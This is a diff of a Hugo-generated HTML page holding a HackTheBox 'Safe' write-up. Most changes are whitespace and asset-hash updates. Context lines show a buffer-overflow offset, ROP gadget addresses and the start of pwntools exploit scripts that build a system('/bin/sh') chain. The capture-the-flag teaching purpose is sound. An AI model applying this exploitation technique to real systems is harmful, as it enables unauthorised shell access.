@@ -28,22 +28,22 @@ Only the Apache2 default page was shown. Maybe we can find more about this by ru
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
 <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
 <meta name="color-scheme" content="light dark"><meta property="og:url" content="https://www.tagnull.de/docs/HTB-Writeups/safe/">
-  <meta property="og:site_name" content="www.tagnull.de">
-  <meta property="og:title" content="Safe">
-  <meta property="og:description" content="External Recon # You know the dance. We start with nmap.
+	<meta property="og:site_name" content="www.tagnull.de">
+	<meta property="og:title" content="Safe">
+	<meta property="og:description" content="External Recon # You know the dance. We start with nmap.
 nmap -sV -sC -oN initial -T4 10.10.10.147 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA) | 256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA) |_ 256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel As there’s not much to see here I visited the website. Only the Apache2 default page was shown. Maybe we can find more about this by running a script scan.">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="docs">
-    <meta property="article:published_time" content="2019-10-24T00:00:00+00:00">
-    <meta property="article:modified_time" content="2019-10-24T00:00:00+00:00">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:published_time" content="2019-10-24T00:00:00+00:00">
+		<meta property="article:modified_time" content="2019-10-24T00:00:00+00:00">
 <title>Safe | www.tagnull.de</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/logo.png" >
 <link rel="canonical" href="https://www.tagnull.de/docs/HTB-Writeups/safe/">
-<link rel="stylesheet" href="/book.min.c8d213ad53b0e74b4a5b6fd785e46d9391863be06d16a90f25baa546f9255961.css" integrity="sha256-yNITrVOw50tKW2/XheRtk5GGO&#43;BtFqkPJbqlRvklWWE=" crossorigin="anonymous">
+<link rel="stylesheet" href="/book.min.a01a62135461eeae0a96c8c4313d37bcbcbd8305780dc247b8ba4b82131dbedb.css" integrity="sha256-oBpiE1Rh7q4KlsjEMT03vLy9gwV4DcJHuLpLghMdvts=" crossorigin="anonymous">
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.c1a640087ca9581469f318b576cf4bd233a82c02e1349334d840c7940a557905.js" integrity="sha256-waZACHypWBRp8xi1ds9L0jOoLALhNJM02EDHlApVeQU=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.96ba587ab96b163b63e753783fd2e8775f3ae8fee15c469d39182619e54674d0.js" integrity="sha256-lrpYerlrFjtj51N4P9Lod1866P7hXEadORgmGeVGdNA=" crossorigin="anonymous"></script>
 <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
@@ -513,7 +513,7 @@ We can use this pattern to find the offset.</p>
 <pre tabindex="0"><code>gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAA
 jAA9AAOAAkAAPAAlAA found at offset: 120
 </code></pre><p>Let&rsquo;s start crafting a first proof of concept and see if we can control &ldquo;RIP&rdquo;.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>           <span style="color:#75715e"># offset to RIP</span>
@@ -568,7 +568,7 @@ would be ideal. We can find such an instruction with &ldquo;objdump&rdquo; in th
 <p>
   <img src="safe-mem-system.png" alt="safe-mem-system" /></p>
 <p>Let&rsquo;s check what we&rsquo;ve got so far.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>system<span style="color:#f92672">()</span>             @ 0x401040
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>system<span style="color:#f92672">()</span>             @ 0x401040
 </span></span><span style="display:flex;"><span>mov rdi, rsp         @ 0x401156
 </span></span><span style="display:flex;"><span>jmp r13              @ 0x401159
 </span></span><span style="display:flex;"><span>pop r13, r14, r15    @ 0x401206</span></span></code></pre></div>
@@ -576,7 +576,7 @@ would be ideal. We can find such an instruction with &ldquo;objdump&rdquo; in th
 junk. Then the address of the <kbd>pop r13</kbd> instruction. It will &ldquo;pop&rdquo; the first value from the &ldquo;stack&rdquo; into &ldquo;r13&rdquo;. We want <kbd>system()</kbd> to be in &ldquo;r13&rdquo;. So the address to <kbd>system()</kbd> will be next. After <kbd>pop r13</kbd>, two more &ldquo;pop&rsquo;s&rdquo; will take place. We need to place two dummy values on the &ldquo;stack&rdquo; to account for that. Now we need to prepare the arguments for the <kbd>system()</kbd> call. So the address to <kbd>mov rdi, rsp</kbd> will be next, followed by the string <kbd>/bin/sh\x00</kbd>.</p>
 <p>You might have noticed that the <kbd>jmp r13</kbd> doesn&rsquo;t need to be put into our &ldquo;rop-chain&rdquo; directly. It&rsquo;s the next instruction after <kbd>mov rdi, rsp</kbd> and will be executed after that. How nice. ;)</p>
 <p>Let&rsquo;s put all of this into an exploit script.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Stage 0</span>
@@ -620,7 +620,7 @@ And we also have access to the <code>user.txt</code>.</p>
   <img src="safe-userflag.png" alt="safe-mem-system" /></p>
 <p>Between rooting this box and writing this writeup I played a lot with this binary.
 This is why I also have a &ldquo;pwntools&rdquo; version of this exploit. This version doesn&rsquo;t need the &ldquo;cat&rdquo; magic.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># PwnTools</span>
